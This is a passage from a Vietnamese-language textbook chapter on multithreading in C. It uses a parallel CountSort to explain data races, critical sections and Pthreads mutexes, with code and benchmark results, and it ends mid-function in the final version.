<p>Sau bước 1, tần suất của mỗi giá trị được lưu trong mảng <code>counts</code> có độ dài 10, trong đó <code>counts[i]</code> là số lần giá trị <em>i</em> xuất hiện trong mảng <code>A</code>.<br />
Ví dụ: vì có 3 phần tử có giá trị 2 trong mảng <code>A</code>, nên <code>counts[2]</code> = 3.</p>
<p>Mảng <code>counts</code> tương ứng với ví dụ trên như sau:</p>
<pre><code>counts = [3, 2, 3, 0, 2, 1, 0, 1, 0, 3]
</code></pre>
<p>Lưu ý rằng tổng tất cả các phần tử trong mảng <code>counts</code> bằng đúng độ dài của <code>A</code>, tức <strong>15</strong>.</p>
<p>Bước 2 sử dụng mảng <code>counts</code> để ghi đè <code>A</code>, dựa vào tần suất để xác định tập chỉ số trong <code>A</code> lưu trữ mỗi giá trị liên tiếp theo thứ tự đã sắp xếp.<br />
Ví dụ: vì mảng <code>counts</code> cho biết có 3 phần tử giá trị 0 và 2 phần tử giá trị 1 trong <code>A</code>, nên 3 phần tử đầu tiên của mảng kết quả sẽ là 0, và 2 phần tử tiếp theo sẽ là 1.</p>
<p>Sau khi chạy bước 2, mảng cuối cùng sẽ như sau:</p>
<pre><code>A = [0, 0, 0, 1, 1, 2, 2, 2, 4, 4, 5, 7, 9, 9, 9]
</code></pre>
<p>Dưới đây là phần cài đặt <strong>tuần tự</strong> của thuật toán CountSort, với hai hàm <code>count</code> (bước 1) và <code>overwrite</code> (bước 2) được phân tách rõ ràng.<br />
Để ngắn gọn, chúng tôi không đưa toàn bộ chương trình ở đây, nhưng bạn có thể tải mã nguồn tại: <a href="C14-SharedMemory/_attachments/countSort.c">countSort.c</a>.</p>
<pre><code class="language-c">#define MAX 10 //the maximum value of an element. (10 means 0-9)

/*step 1:
 * compute the frequency of all the elements in the input array and store
 * the associated counts of each element in array counts. The elements in the
 * counts array are initialized to zero prior to the call to this function.
*/
void countElems(int *counts, int *array_A, long length) {
    int val, i;
    for (i = 0; i &lt; length; i++) {
      val = array_A[i]; //read the value at index i
      counts[val] = counts[val] + 1; //update corresponding location in counts
    }
}

/* step 2:
 * overwrite the input array (array_A) using the frequencies stored in the
 *  array counts
*/
void writeArray(int *counts, int *array_A) {
    int i, j = 0, amt;

    for (i = 0; i &lt; MAX; i++) { //iterate over the counts array
        amt = counts[i]; //capture frequency of element i
        while (amt &gt; 0) { //while all values aren't written
            array_A[j] = i; //replace value at index j of array_A with i
            j++; //go to next position in array_A
            amt--; //decrease the amount written by 1
        }
    }
}

/* main function:
 * gets array length from command line args, allocates a random array of that
 * size, allocates the counts array, the executes step 1 of the CountSort
 * algorithm (countsElem) followed by step 2 (writeArray).
*/
int main( int argc, char **argv ) {
    //code ommitted for brevity -- download source to view full file

    srand(10); //use of static seed ensures the output is the same every run

    long length = strtol( argv[1], NULL, 10 );
    int verbose = atoi(argv[2]);

    //generate random array of elements of specified length
    int *array = malloc(length * sizeof(int));
    genRandomArray(array, length);

    //print unsorted array (commented out)
    //printArray(array, length);

    //allocate counts array and initializes all elements to zero.
    int counts[MAX] = {0};

    countElems(counts, array, length); //calls step 1
    writeArray(counts, array); //calls step2

    //print sorted array (commented out)
    //printArray(array, length);

    free(array); //free memory

    return 0;
}
</code></pre>
<p>Chạy chương trình này trên một mảng có kích thước 15 cho ra kết quả sau:</p>
<pre><code class="language-bash">$ ./countSort 15 1
array before sort:
5 8 8 5 8 7 5 1 7 7 3 3 8 3 4
result after sort:
1 3 3 3 4 5 5 5 7 7 7 8 8 8 8
</code></pre>
<p>Tham số thứ hai của chương trình là cờ <em>verbose</em>, cho biết chương trình có in kết quả ra hay không.<br />
Tùy chọn này hữu ích với các mảng lớn, khi ta muốn chạy chương trình nhưng <strong>không nhất thiết</strong> phải in toàn bộ kết quả.</p>
<h3 id="song-song-hóa-countelems-thử-nghiệm-ban-đầu"><a class="header" href="#song-song-hóa-countelems-thử-nghiệm-ban-đầu">Song song hóa <code>countElems</code>: Thử nghiệm ban đầu</a></h3>
<p>Thuật toán <strong>CountSort</strong> gồm hai bước chính, và cả hai đều có thể hưởng lợi từ việc song song hóa.<br />
Trong phần còn lại của chương này, chúng ta sẽ tập trung vào song song hóa <strong>bước 1</strong>, tức hàm <code>countElems</code>.<br />
Việc song song hóa hàm <code>writeArray</code> được để lại như một bài tập cho người đọc.</p>
<p>Đoạn code dưới đây minh họa <strong>lần thử đầu tiên</strong> tạo phiên bản đa luồng của hàm <code>countElems</code>.<br />
Một số phần của code (phân tích tham số, xử lý lỗi) được lược bỏ để ngắn gọn, nhưng bạn có thể tải toàn bộ mã nguồn tại: <a href="C14-SharedMemory/_attachments/countElems_p.c">countElems_p.c</a>.</p>
<p>Trong đoạn code này, mỗi thread sẽ đếm tần suất xuất hiện của các phần tử trong <strong>phần mảng</strong> được gán cho nó từ mảng toàn cục, và cập nhật vào mảng đếm toàn cục <code>counts</code>:</p>
<pre><code class="language-c">/*parallel version of step 1 (first cut) of CountSort algorithm:
 * extracts arguments from args value
 * calculates the portion of the array that thread is responsible for counting
 * computes the frequency of all the elements in assigned component and stores
 * the associated counts of each element in counts array
*/
void *countElems( void *args ) {
    struct t_arg * myargs = (struct t_arg *)args;
    //extract arguments (omitted for brevity)
    int *array = myargs-&gt;ap;
    long *counts = myargs-&gt;countp;
    //... (get nthreads, length, myid)

    //assign work to the thread
    long chunk = length / nthreads; //nominal chunk size
    long start = myid * chunk;
    long end = (myid + 1) * chunk;
    long val;
    if (myid == nthreads-1) {
        end = length;
    }

    long i;
    //heart of the program
    for (i = start; i &lt; end; i++) {
        val = array[i];
        counts[val] = counts[val] + 1;
    }

    return NULL;
}
</code></pre>
<p>Hàm <code>main</code> gần như giống hệt các chương trình mẫu trước đây:</p>
<pre><code class="language-c">int main(int argc, char **argv) {

    if (argc != 4) {
        //print out usage info (ommitted for brevity)
        return 1;
    }

    srand(10); //static seed to assist in correctness check

    //parse command line arguments
    long t;
    long length = strtol(argv[1], NULL, 10);
    int verbose = atoi(argv[2]);
    long nthreads = strtol(argv[3], NULL, 10);

    //generate random array of elements of specified length
    int *array = malloc(length * sizeof(int));
    genRandomArray(array, length);

    //specify counts array and initialize all elements to zero
    long counts[MAX] = {0};

    //allocate threads and args array
    pthread_t *thread_array; //pointer to future thread array
    thread_array = malloc(nthreads * sizeof(pthread_t)); //allocate the array
    struct t_arg *thread_args = malloc( nthreads * sizeof(struct t_arg) );

    //fill thread array with parameters
    for (t = 0; t &lt; nthreads; t++) {
        //ommitted for brevity...
    }

    for (t = 0; t &lt; nthreads; t++) {
        pthread_create(&amp;thread_array[t], NULL, countElems, &amp;thread_args[t]);
    }

    for (t = 0; t &lt; nthreads; t++) {
        pthread_join(thread_array[t], NULL);
    }

    free(thread_array);
    free(array);

    if (verbose) {
        printf(&quot;Counts array:\n&quot;);
        printCounts(counts);
    }
    return 0;
}
</code></pre>
<p>Để đảm bảo khả năng tái lập kết quả, bộ sinh số ngẫu nhiên được <strong>seed</strong> với giá trị cố định (10), nhằm đảm bảo mảng <code>array</code> (và do đó <code>counts</code>) luôn chứa cùng một tập giá trị ở mỗi lần chạy.<br />
Một hàm bổ sung (<code>printCounts</code>) sẽ in nội dung của mảng <code>counts</code> toàn cục.<br />
Kỳ vọng là, <strong>bất kể</strong> số lượng thread sử dụng, nội dung mảng <code>counts</code> phải luôn giống nhau.<br />
Để ngắn gọn, phần xử lý lỗi đã được lược bỏ.</p>
<p>Biên dịch chương trình và chạy với 1, 2 và 4 thread trên mảng 10 triệu phần tử cho kết quả:</p>
<pre><code class="language-bash">$ gcc -o countElems_p countElems_p.c -pthread

$./countElems_p 10000000 1 1
Counts array:
999170 1001044 999908 1000431 999998 1001479 999709 997250 1000804 1000207

$./countElems_p 10000000 1 2
Counts array:
661756 661977 657828 658479 657913 659308 658561 656879 658070 657276

$./countElems_p 10000000 1 4
Counts array:
579846 580814 580122 579772 582509 582713 582518 580917 581963 581094
</code></pre>
<p>Lưu ý rằng kết quả in ra <strong>thay đổi đáng kể</strong> ở mỗi lần chạy.<br />
Đặc biệt, chúng thay đổi khi ta thay đổi số lượng thread!<br />
Điều này <strong>không nên xảy ra</strong>, vì việc dùng seed tĩnh đảm bảo cùng một tập giá trị ở mỗi lần chạy.</p>
<p>Những kết quả này <strong>vi phạm</strong> một trong những nguyên tắc cơ bản của lập trình đa luồng:</p>
<blockquote>
<p><strong>Kết quả của chương trình phải đúng và nhất quán, bất kể số lượng thread sử dụng.</strong></p>
</blockquote>
<p>Vì lần thử đầu tiên song song hóa <code>countElems</code> dường như <strong>không hoạt động đúng</strong>, hãy đi sâu hơn để xem chương trình đang làm gì và cách khắc phục.</p>
<h3 id="data-races-tranh-chấp-dữ-liệu"><a class="header" href="#data-races-tranh-chấp-dữ-liệu">Data Races (Tranh chấp dữ liệu)</a></h3>
<p>Để hiểu chuyện gì đang xảy ra, hãy xét một ví dụ chạy với <strong>hai thread</strong> trên <strong>hai core</strong> riêng biệt của một hệ thống đa lõi.<br />
Hãy nhớ rằng việc thực thi của bất kỳ thread nào cũng có thể bị <strong>OS</strong> tạm dừng (preempt) tại bất kỳ thời điểm nào, nghĩa là mỗi thread có thể đang chạy <strong>các lệnh khác nhau</strong> của cùng một hàm tại một thời điểm nhất định (hoặc thậm chí cùng một lệnh).</p>
<p>Bảng 1 cho thấy một đường thực thi khả dĩ của hàm <code>countElems</code>.<br />
Để minh họa rõ hơn, chúng ta dịch dòng:</p>
<pre><code class="language-c">counts[val] = counts[val] + 1;
</code></pre>
<p>thành chuỗi lệnh tương đương sau:</p>
<ol>
<li><strong>Read</strong> <code>counts[val]</code> và đưa vào một thanh ghi.</li>
<li><strong>Modify</strong> thanh ghi bằng cách tăng giá trị lên 1.</li>
<li><strong>Write</strong> nội dung của thanh ghi trở lại <code>counts[val]</code>.</li>
</ol>
<p>Mẫu này được gọi là <strong>read–modify–write</strong>.<br />
Trong ví dụ ở Bảng 1, mỗi thread chạy trên một core riêng (Thread 0 trên Core 0, Thread 1 trên Core 1).<br />
Chúng ta bắt đầu quan sát quá trình tại thời điểm <em>i</em>, khi cả hai thread đều có <code>val</code> = 1.</p>
<div class="table-wrapper"><table><thead><tr><th>Thời điểm</th><th>Thread 0</th><th>Thread 1</th></tr></thead><tbody>
<tr><td><em>i</em></td><td>Đọc <code>counts[1]</code> và đưa vào thanh ghi của Core 0</td><td>...</td></tr>
<tr><td><em>i+1</em></td><td>Tăng giá trị trong thanh ghi lên 1</td><td>Đọc <code>counts[1]</code> và đưa vào thanh ghi của Core 1</td></tr>
<tr><td><em>i+2</em></td><td>Ghi đè <code>counts[1]</code> bằng nội dung của thanh ghi</td><td>Tăng giá trị trong thanh ghi lên 1</td></tr>
<tr><td><em>i+3</em></td><td>...</td><td>Ghi đè <code>counts[1]</code> bằng nội dung của thanh ghi</td></tr>
</tbody></table>
</div>
<p><strong>Bảng 1.</strong> Một trình tự thực thi khả dĩ của hai thread khi chạy <code>countElems</code></p>
<p>Giả sử trước khi thực hiện trình tự trong <a href="C14-SharedMemory/synchronization.html#ExecSequence">Bảng 1</a>, <code>counts[1]</code> chứa giá trị <strong>60</strong>.<br />
Tại thời điểm <em>i</em>, Thread 0 đọc <code>counts[1]</code> và đưa giá trị 60 vào thanh ghi của Core 0.<br />
Tại thời điểm <em>i+1</em>, trong khi Thread 0 tăng giá trị trong thanh ghi của Core 0 lên 1, thì <strong>giá trị hiện tại</strong> của <code>counts[1]</code> (60) được Thread 1 đọc và đưa vào thanh ghi của Core 1.<br />
Tại thời điểm <em>i+2</em>, Thread 0 cập nhật <code>counts[1]</code> thành 61, trong khi Thread 1 tăng giá trị trong thanh ghi cục bộ của nó (60) lên 1.<br />
Kết quả cuối cùng là tại thời điểm <em>i+3</em>, giá trị <code>counts[1]</code> bị Thread 1 ghi đè thành 61, <strong>không phải</strong> 62 như mong đợi!<br />
Điều này khiến <code>counts[1]</code> về cơ bản <strong>bị mất</strong> một lần tăng.</p>
<p>Chúng ta gọi tình huống hai thread cố gắng ghi vào cùng một vị trí bộ nhớ là <strong>data race</strong> (tranh chấp dữ liệu).<br />
Nói chung hơn, <strong>race condition</strong> là bất kỳ tình huống nào mà việc thực thi đồng thời của hai thao tác dẫn đến kết quả sai.<br />
Lưu ý rằng việc <strong>đọc đồng thời</strong> <code>counts[1]</code> <strong>không</strong> tự nó tạo thành race condition, vì việc đọc giá trị từ bộ nhớ thường không gây vấn đề.<br />
Chính sự kết hợp của bước đọc này với các thao tác ghi vào <code>counts[1]</code> mới gây ra kết quả sai.<br />
Mẫu <strong>read–modify–write</strong> này là một nguồn phổ biến gây ra <strong>data race</strong> trong hầu hết các chương trình đa luồng.<br />
Trong phần thảo luận về race condition và cách khắc phục, chúng ta sẽ tập trung vào <strong>data race</strong>.</p>
<blockquote>
<p><strong>Atomic operations</strong><br />
Một thao tác được gọi là <strong>atomic</strong> nếu một thread nhận thấy nó được thực hiện <strong>không bị gián đoạn</strong> (nói cách khác, là một hành động “tất cả hoặc không gì cả”).<br />
Trong một số thư viện, có từ khóa hoặc kiểu dữ liệu để chỉ định rằng một khối tính toán nên được xử lý như một thao tác atomic.<br />
Trong ví dụ trước, dòng <code>counts[val] = counts[val] + 1</code> (ngay cả khi viết là <code>counts[val]++</code>) <strong>không</strong> phải là atomic, vì dòng này thực tế tương ứng với nhiều lệnh ở cấp độ máy.<br />
Cần có một cấu trúc đồng bộ hóa như <strong>mutual exclusion</strong> (loại trừ lẫn nhau) để đảm bảo không xảy ra data race.<br />
Nói chung, nên giả định rằng mọi thao tác đều <strong>không atomic</strong> trừ khi mutual exclusion được áp dụng một cách tường minh.</p>
</blockquote>
<p>Hãy nhớ rằng <strong>không phải</strong> mọi trình tự thực thi của hai thread đều gây ra race condition.<br />
Xem ví dụ trình tự thực thi của Thread 0 và Thread 1 trong Bảng 2.</p>
<div class="table-wrapper"><table><thead><tr><th>Thời điểm</th><th>Thread 0</th><th>Thread 1</th></tr></thead><tbody>
<tr><td><em>i</em></td><td>Đọc <code>counts[1]</code> và đưa vào thanh ghi của Core 0</td><td>...</td></tr>
<tr><td><em>i+1</em></td><td>Tăng giá trị trong thanh ghi lên 1</td><td>...</td></tr>
<tr><td><em>i+2</em></td><td>Ghi đè <code>counts[1]</code> bằng nội dung của thanh ghi</td><td>...</td></tr>
<tr><td><em>i+3</em></td><td>...</td><td>Đọc <code>counts[1]</code> và đưa vào thanh ghi của Core 1</td></tr>
<tr><td><em>i+4</em></td><td>...</td><td>Tăng giá trị trong thanh ghi lên 1</td></tr>
<tr><td><em>i+5</em></td><td>...</td><td>Ghi đè <code>counts[1]</code> bằng nội dung của thanh ghi</td></tr>
</tbody></table>
</div>
<p><strong>Bảng 2.</strong> Một trình tự thực thi khác của hai thread khi chạy <code>countElems</code></p>
<p>Trong trình tự này, Thread 1 <strong>không</strong> đọc <code>counts[1]</code> cho đến <strong>sau</strong> khi Thread 0 đã cập nhật giá trị mới (61).<br />
Kết quả là Thread 1 đọc giá trị 61 từ <code>counts[1]</code> và đưa vào thanh ghi của Core 1 tại thời điểm <em>i+3</em>, sau đó ghi giá trị 62 vào <code>counts[1]</code> tại thời điểm <em>i+5</em>.</p>
<p>Để khắc phục <strong>data race</strong>, trước tiên chúng ta phải xác định <strong>critical section</strong> — phần code cần được thực thi <strong>atomic</strong> (cô lập) để đảm bảo hành vi đúng.<br />
Trong các chương trình đa luồng, các khối code cập nhật tài nguyên chia sẻ thường được xác định là critical section.</p>
<p>Trong hàm <code>countElems</code>, các thao tác cập nhật mảng <code>counts</code> cần được đặt trong critical section để đảm bảo giá trị không bị mất do nhiều thread cùng cập nhật một vị trí bộ nhớ:</p>
<pre><code class="language-c">long i;
for (i = start; i &lt; end; i++) {
    val = array[i];
    counts[val] = counts[val] + 1; // dòng này cần được bảo vệ
}
</code></pre>
<p>Vì vấn đề cốt lõi trong <code>countElems</code> là việc <strong>truy cập đồng thời</strong> vào mảng <code>counts</code> bởi nhiều thread, nên cần có một cơ chế đảm bảo rằng <strong>chỉ một thread</strong> được thực thi bên trong <strong>critical section</strong> tại một thời điểm.<br />
Sử dụng một cấu trúc đồng bộ hóa (như <strong>mutex</strong>, sẽ được trình bày trong phần tiếp theo) sẽ buộc các thread phải <strong>lần lượt</strong> đi vào critical section.</p>
<div style="break-before: page; page-break-before: always;"></div><h3 id="1431-loại-trừ-lẫn-nhau-mutual-exclusion"><a class="header" href="#1431-loại-trừ-lẫn-nhau-mutual-exclusion">14.3.1. Loại trừ lẫn nhau (Mutual Exclusion)</a></h3>
<p><em>Mutex là gì? Câu trả lời ở ngoài kia, nó đang tìm kiếm bạn, và nó sẽ tìm thấy bạn nếu bạn muốn.</em></p>
<p>~ Trinity giải thích về mutex cho Neo (Xin lỗi <em>The Matrix</em>)</p>
<p>Để khắc phục <strong>data race</strong> (tranh chấp dữ liệu), chúng ta sẽ sử dụng một cấu trúc đồng bộ hóa gọi là <strong>mutual exclusion lock</strong> (khóa loại trừ lẫn nhau), hay <strong>mutex</strong>.<br />
Mutex là một loại <strong>synchronization primitive</strong> (nguyên thủy đồng bộ hóa) đảm bảo rằng tại bất kỳ thời điểm nào, chỉ <strong>một</strong> thread được phép vào và thực thi đoạn code bên trong <strong>critical section</strong> (vùng tới hạn).</p>
<p>Trước khi sử dụng mutex, chương trình cần:</p>
<ol>
<li><strong>Khai báo</strong> mutex trong vùng nhớ được chia sẻ giữa các thread (thường là biến toàn cục).</li>
<li><strong>Khởi tạo</strong> mutex trước khi các thread cần dùng (thường trong hàm <code>main</code>).</li>
</ol>
<p>Thư viện <strong>Pthreads</strong> định nghĩa kiểu <code>pthread_mutex_t</code> cho mutex.<br />
Để khai báo một biến mutex, thêm dòng:</p>
<pre><code class="language-c">pthread_mutex_t mutex;
</code></pre>
<p>Để khởi tạo mutex, dùng hàm <code>pthread_mutex_init</code>, nhận vào địa chỉ của mutex và một cấu trúc thuộc tính (thường đặt là <code>NULL</code>):</p>
<pre><code class="language-c">pthread_mutex_init(&amp;mutex, NULL);
</code></pre>
<p>Khi không còn cần mutex nữa (thường ở cuối hàm <code>main</code>, sau khi gọi <code>pthread_join</code>), chương trình nên giải phóng cấu trúc mutex bằng cách gọi <code>pthread_mutex_destroy</code>:</p>
<pre><code class="language-c">pthread_mutex_destroy(&amp;mutex);
</code></pre>
<h4 id="mutex-khóa-và-sẵn-sàng"><a class="header" href="#mutex-khóa-và-sẵn-sàng">Mutex: Khóa và sẵn sàng</a></h4>
<p>Trạng thái ban đầu của mutex là <strong>unlocked</strong> (mở khóa), nghĩa là bất kỳ thread nào cũng có thể sử dụng ngay.<br />
Để vào critical section, một thread phải <strong>acquire</strong> (giành) được khóa.<br />
Điều này được thực hiện bằng cách gọi hàm <code>pthread_mutex_lock</code>.</p>
<p>Sau khi một thread đã giữ khóa, <strong>không thread nào khác</strong> có thể vào critical section cho đến khi thread giữ khóa <strong>release</strong> (nhả) nó.<br />
Nếu một thread khác gọi <code>pthread_mutex_lock</code> khi mutex đang bị khóa, thread đó sẽ <strong>block</strong> (chờ) cho đến khi mutex khả dụng.<br />
Hãy nhớ rằng <a href="C14-SharedMemory/../C13-OS/processes.html#_process_state"><em>blocking</em> nghĩa là thread sẽ không được lập lịch</a> để sử dụng CPU cho đến khi điều kiện nó chờ (mutex khả dụng) trở thành đúng.</p>
<p>Khi một thread thoát khỏi critical section, nó phải gọi <code>pthread_mutex_unlock</code> để nhả mutex, cho phép thread khác sử dụng.<br />
Như vậy, tại một thời điểm, tối đa chỉ có <strong>một thread</strong> giữ khóa và vào critical section, ngăn chặn nhiều thread cùng “tranh” đọc và cập nhật biến chia sẻ.</p>
<p>Sau khi đã khai báo và khởi tạo mutex, câu hỏi tiếp theo là <strong>đặt lệnh khóa và mở khóa ở đâu</strong> để đảm bảo critical section được bảo vệ tốt nhất.<br />
Dưới đây là một thử nghiệm ban đầu khi bổ sung mutex vào hàm <code>countElems</code><br />
(Toàn bộ mã nguồn có thể tải từ <a href="C14-SharedMemory/_attachments/countElems_p_v2.c">countElems_p_v2.c</a>):</p>
<pre><code class="language-c">pthread_mutex_t mutex; //global declaration of mutex, initialized in main()

/*parallel version of step 1 of CountSort algorithm (attempt 1 with mutexes):
 * extracts arguments from args value
 * calculates component of the array that thread is responsible for counting
 * computes the frequency of all the elements in assigned component and stores
 * the associated counts of each element in counts array
*/
void *countElems( void *args ) {
    //extract arguments
    //ommitted for brevity
    int *array = myargs-&gt;ap;
    long *counts = myargs-&gt;countp;

    //assign work to the thread
    long chunk = length / nthreads; //nominal chunk size
    long start = myid * chunk;
    long end = (myid + 1) * chunk;
    long val;
    if (myid == nthreads - 1) {
        end = length;
    }
    long i;

    //heart of the program
    pthread_mutex_lock(&amp;mutex); //acquire the mutex lock
    for (i = start; i &lt; end; i++) {
        val = array[i];
        counts[val] = counts[val] + 1;
    }
    pthread_mutex_unlock(&amp;mutex); //release the mutex lock

    return NULL;
}
</code></pre>
<p>Các lệnh khởi tạo và hủy mutex được đặt trong <code>main</code>, bao quanh phần tạo và join thread:</p>
<pre><code class="language-c">// trích từ hàm main():

pthread_mutex_init(&amp;mutex, NULL); // khởi tạo mutex

for (t = 0; t &lt; nthreads; t++) {
    pthread_create(&amp;thread_array[t], NULL, countElems, &amp;thread_args[t]);
}

for (t = 0; t &lt; nthreads; t++) {
    pthread_join(thread_array[t], NULL);
}

pthread_mutex_destroy(&amp;mutex); // hủy (giải phóng) mutex
</code></pre>
<p>Hãy biên dịch lại và chạy chương trình mới này với số lượng thread khác nhau:</p>
<pre><code>$ ./countElems_p_v2 10000000 1 1
Counts array:
999170 1001044 999908 1000431 999998 1001479 999709 997250 1000804 1000207

$ ./countElems_p_v2 10000000 1 2
Counts array:
999170 1001044 999908 1000431 999998 1001479 999709 997250 1000804 1000207

$ ./countElems_p_v2 10000000 1 4
Counts array:
999170 1001044 999908 1000431 999998 1001479 999709 997250 1000804 1000207
</code></pre>
<p>Tuyệt vời — kết quả <strong>cuối cùng</strong> đã nhất quán bất kể số lượng thread!</p>
<p>Hãy nhớ rằng một mục tiêu quan trọng khác của multithreading là <strong>giảm thời gian chạy</strong> của chương trình khi số lượng thread tăng (tức là <em>tăng tốc</em> thực thi).<br />
Hãy benchmark hiệu năng của hàm <code>countElems</code>.</p>
<p>Mặc dù có thể bạn muốn dùng lệnh <code>time -p</code>, nhưng hãy nhớ rằng <code>time -p</code> đo <strong>wall-clock time</strong> của <strong>toàn bộ</strong> chương trình (bao gồm cả phần sinh dữ liệu ngẫu nhiên), chứ <strong>không chỉ</strong> thời gian chạy của <code>countElems</code>.<br />
Trong trường hợp này, tốt hơn là dùng system call <code>gettimeofday</code>, cho phép đo chính xác wall-clock time của một đoạn code cụ thể.</p>
<p>Benchmark <code>countElems</code> trên 100 triệu phần tử cho kết quả:</p>
<pre><code>$ ./countElems_p_v2 100000000 0 1
Time for Step 1 is 0.368126 s

$ ./countElems_p_v2 100000000 0 2
Time for Step 1 is 0.438357 s

$ ./countElems_p_v2 100000000 0 4
Time for Step 1 is 0.519913 s
</code></pre>
<p>Việc <strong>tăng số lượng thread</strong> lại khiến chương trình <strong>chạy chậm hơn</strong>! Điều này đi ngược lại mục tiêu sử dụng thread để làm chương trình <strong>nhanh hơn</strong>.</p>
<p>Để hiểu chuyện gì đang xảy ra, hãy xem vị trí đặt <strong>lock</strong> trong hàm <code>countElems</code>:</p>
<pre><code class="language-c">// trích đoạn code từ hàm countElems ở phần trước
// phần lõi của chương trình
pthread_mutex_lock(&amp;mutex); // giành mutex lock
for (i = start; i &lt; end; i++){
    val = array[i];
    counts[val] = counts[val] + 1;
}
pthread_mutex_unlock(&amp;mutex); // nhả mutex lock
</code></pre>
<p>Trong ví dụ này, chúng ta đặt lock bao quanh <strong>toàn bộ</strong> vòng lặp <code>for</code>.<br />
Mặc dù cách đặt này giải quyết vấn đề <strong>đúng đắn</strong> (correctness), nhưng lại <strong>rất tệ</strong> về mặt hiệu năng — critical section giờ bao trùm toàn bộ thân vòng lặp.<br />
Đặt lock như vậy đảm bảo rằng <strong>chỉ một thread</strong> có thể thực thi vòng lặp tại một thời điểm, về cơ bản là <strong>tuần tự hóa</strong> chương trình!</p>
<h4 id="the-mutex-reloaded"><a class="header" href="#the-mutex-reloaded">The Mutex: Reloaded</a></h4>
<p>Hãy thử một cách tiếp cận khác: đặt lệnh <strong>lock</strong> và <strong>unlock</strong> mutex <strong>bên trong mỗi vòng lặp</strong>:</p>
<pre><code class="language-c">/* phiên bản code đã chỉnh sửa của hàm countElems:
 * lock được đặt BÊN TRONG vòng for!
 */
// phần lõi của chương trình
for (i = start; i &lt; end; i++) {
    val = array[i];
    pthread_mutex_lock(&amp;m); // giành mutex lock
    counts[val] = counts[val] + 1;
    pthread_mutex_unlock(&amp;m); // nhả mutex lock
}
</code></pre>
<p>Thoạt nhìn, đây có vẻ là giải pháp tốt hơn vì mỗi thread có thể vào vòng lặp song song, chỉ tuần tự hóa khi chạm tới lock.<br />
Critical section lúc này rất nhỏ, chỉ bao gồm dòng <code>counts[val] = counts[val] + 1</code>.</p>
<p>Trước tiên, hãy kiểm tra tính đúng đắn của phiên bản này:</p>
<pre><code>$ ./countElems_p_v3 10000000 1 1
Counts array:
999170 1001044 999908 1000431 999998 1001479 999709 997250 1000804 1000207

$ ./countElems_p_v3 10000000 1 2
Counts array:
999170 1001044 999908 1000431 999998 1001479 999709 997250 1000804 1000207

$ ./countElems_p_v3 10000000 1 4
Counts array:
999170 1001044 999908 1000431 999998 1001479 999709 997250 1000804 1000207
</code></pre>
<p>Tốt — phiên bản này cũng cho kết quả <strong>nhất quán</strong> bất kể số lượng thread.</p>
<p>Bây giờ, hãy xem hiệu năng:</p>
<pre><code>$ ./countElems_p_v3 100000000 0 1
Time for Step 1 is 1.92225 s

$ ./countElems_p_v3 100000000 0 2
Time for Step 1 is 10.9704 s

$ ./countElems_p_v3 100000000 0 4
Time for Step 1 is 9.13662 s
</code></pre>
<p>Chạy phiên bản này cho kết quả <strong>chậm hơn đáng kể</strong>!</p>
<p>Hóa ra, việc <strong>lock</strong> và <strong>unlock</strong> mutex là các thao tác <strong>tốn kém</strong>.<br />
Hãy nhớ lại phần thảo luận về <a href="C14-SharedMemory/../C12-CodeOpt/loops_functions.html#_function_inlining">tối ưu hóa lời gọi hàm</a>:<br />
gọi một hàm lặp đi lặp lại (và không cần thiết) trong vòng lặp có thể là nguyên nhân chính gây chậm chương trình.</p>
<p>Trong cách dùng mutex trước đây, mỗi thread chỉ lock và unlock <strong>một lần</strong>.<br />
Trong giải pháp hiện tại, mỗi thread lock và unlock <strong>n/t</strong> lần, trong đó:</p>
<ul>
<li><em>n</em> là kích thước mảng</li>
<li><em>t</em> là số lượng thread</li>
<li><em>n/t</em> là số phần tử mảng được gán cho mỗi thread</li>
</ul>
<p>Kết quả là chi phí của các thao tác mutex bổ sung làm chậm đáng kể việc thực thi vòng lặp.</p>
<h4 id="the-mutex-revisited"><a class="header" href="#the-mutex-revisited">The Mutex: Revisited</a></h4>
<p>Ngoài việc bảo vệ critical section để đảm bảo tính đúng đắn, một giải pháp lý tưởng sẽ:</p>
<ol>
<li>Sử dụng lock và unlock <strong>ít nhất có thể</strong>.</li>
<li>Giảm kích thước critical section xuống <strong>nhỏ nhất có thể</strong>.</li>
</ol>
<p>Phiên bản đầu tiên đáp ứng yêu cầu (1), trong khi phiên bản thứ hai cố gắng đạt yêu cầu (2).<br />
Thoạt nhìn, hai yêu cầu này có vẻ <strong>mâu thuẫn</strong>.<br />
Liệu có cách nào để đạt được <strong>cả hai</strong> (và đồng thời tăng tốc chương trình) không?</p>
<p>Trong lần thử tiếp theo, mỗi thread sẽ duy trì một mảng đếm (<em>counts array</em>) <strong>cục bộ</strong> trên stack của nó.<br />
Vì mảng này là <strong>local</strong> cho từng thread, thread có thể truy cập mà <strong>không cần lock</strong> — không có nguy cơ race condition trên dữ liệu không được chia sẻ.</p>
<p>Mỗi thread sẽ xử lý phần mảng được gán và điền vào mảng đếm cục bộ của mình.<br />
Sau khi đếm xong tất cả giá trị trong phần dữ liệu của mình, mỗi thread sẽ:</p>
<ol>
<li><strong>Lock</strong> mutex chia sẻ (vào critical section).</li>
<li>Cộng giá trị từ mảng đếm cục bộ vào mảng <code>counts</code> chia sẻ.</li>
<li><strong>Unlock</strong> mutex chia sẻ (thoát critical section).</li>
</ol>
<p>Việc giới hạn mỗi thread chỉ cập nhật mảng <code>counts</code> chia sẻ <strong>một lần</strong> giúp giảm đáng kể tranh chấp trên biến chia sẻ và giảm thiểu các thao tác mutex tốn kém.</p>
<p>Dưới đây là phiên bản <code>countElems</code> đã chỉnh sửa.<br />
Toàn bộ mã nguồn của chương trình cuối cùng này có thể xem tại<br />
(<a href="C14-SharedMemory/_attachments/countElems_p_v3.c">countElems_p_v3.c</a>):</p>
<pre><code class="language-c">/*parallel version of step 1 of CountSort algorithm (final attempt w/mutexes):
 * extracts arguments from args value
 * calculates component of the array that thread is responsible for counting
 * computes the frequency of all the elements in assigned component and stores
 * the associated counts of each element in counts array
*/
void *countElems( void *args ) {
    //extract arguments
    //ommitted for brevity
    int *array = myargs-&gt;ap;
    long *counts = myargs-&gt;countp;

    //local declaration of counts array, initializes every element to zero.
    long local_counts[MAX] = {0};

    //assign work to the thread
    long chunk = length / nthreads; //nominal chunk size
    long start = myid * chunk;
    long end = (myid + 1) * chunk;
    long val;
    if (myid == nthreads-1)
        end = length;

    long i;

    //heart of the program
    for (i = start; i &lt; end; i++) {
        val = array[i];

        //updates local counts array
        local_counts[val] = local_counts[val] + 1;
    }

    //update to global counts array
    pthread_mutex_lock(&amp;mutex); //acquire the mutex lock
    for (i = 0; i &lt; MAX; i++) {
        counts[i] += local_counts[i];
    }
